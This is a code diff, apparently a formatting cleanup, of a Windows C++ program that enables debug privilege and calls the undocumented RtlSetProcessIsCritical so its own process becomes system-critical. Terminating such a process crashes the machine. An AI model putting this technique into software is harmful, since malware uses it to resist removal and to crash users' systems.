@@ -1,9 +1,10 @@
-#include <windows.h>
-
 //////////////////////////////////////////////////////////////////////////
 // Code from http://www.netcore2k.net/projects/freeram
 // Enables specified privilege for process
 //////////////////////////////////////////////////////////////////////////
+
+#include <windows.h>
+
 BOOL EnablePriv(LPCSTR lpszPriv) {
     HANDLE hToken;
     LUID luid;
@@ -12,7 +13,7 @@ BOOL EnablePriv(LPCSTR lpszPriv) {
 
     if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken)) return FALSE;
 
-    if (!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
+    if (!LookupPrivilegeValue(nullptr, lpszPriv, &luid)) {
         CloseHandle(hToken);
         return FALSE;
     }
@@ -21,7 +22,7 @@ BOOL EnablePriv(LPCSTR lpszPriv) {
     tkprivs.Privileges[0].Luid = luid;
     tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
 
-    BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
+    BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), nullptr, nullptr);
     CloseHandle(hToken);
     return bRet;
 }
@@ -37,31 +38,32 @@ BOOL EnablePriv(LPCSTR lpszPriv) {
 // bNeedScb specifics whether system critical breaks will be required
 //		(and already enabled) for the process
 //////////////////////////////////////////////////////////////////////////
-typedef long (WINAPI *RtlSetProcessIsCritical)(IN BOOLEAN bNew, OUT BOOLEAN* pbOld, IN BOOLEAN bNeedScb);
+typedef long (WINAPI *RtlSetProcessIsCritical)(IN BOOLEAN bNew, OUT BOOLEAN *pbOld, IN BOOLEAN bNeedScb);
+
 typedef BOOL (WINAPI *RtlAdjustPrivilege)(ULONG, BOOL, BOOL, PBOOLEAN);
 
 
 int main() {
     // Enable the SE_DEBUG_NAME privilege
-    if (EnablePriv((LPCSTR)SE_DEBUG_NAME) != TRUE) {
+    if (EnablePriv((LPCSTR) SE_DEBUG_NAME) != TRUE) {
         return 0;
     }
 
     // Load ntdll.dll so we can access the function
     HANDLE ntdll = LoadLibrary("ntdll.dll");
-    if (ntdll == NULL) {
+    if (ntdll == nullptr) {
         return 0;
     }
 
     // Declare the function and obtain it using GetProcAddress
     RtlSetProcessIsCritical SetCriticalProcess;
-    SetCriticalProcess = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)ntdll, "RtlSetProcessIsCritical");
+    SetCriticalProcess = (RtlSetProcessIsCritical) GetProcAddress((HINSTANCE) ntdll, "RtlSetProcessIsCritical");
 
     if (!SetCriticalProcess) {
         return 0;
     }
 
-    RtlAdjustPrivilege AdjustPrivilege = (RtlAdjustPrivilege)GetProcAddress((HINSTANCE)ntdll, "RtlAdjustPrivilege");
+    auto AdjustPrivilege = (RtlAdjustPrivilege) GetProcAddress((HINSTANCE) ntdll, "RtlAdjustPrivilege");
     if (!AdjustPrivilege) {
         return 0;
     }
@@ -70,7 +72,7 @@ int main() {
     AdjustPrivilege(20UL, TRUE, FALSE, &b);
 
     // Call it - enable system critical status
-    SetCriticalProcess(TRUE, NULL, FALSE);
+    SetCriticalProcess(TRUE, nullptr, FALSE);
 
     return 0;
 }
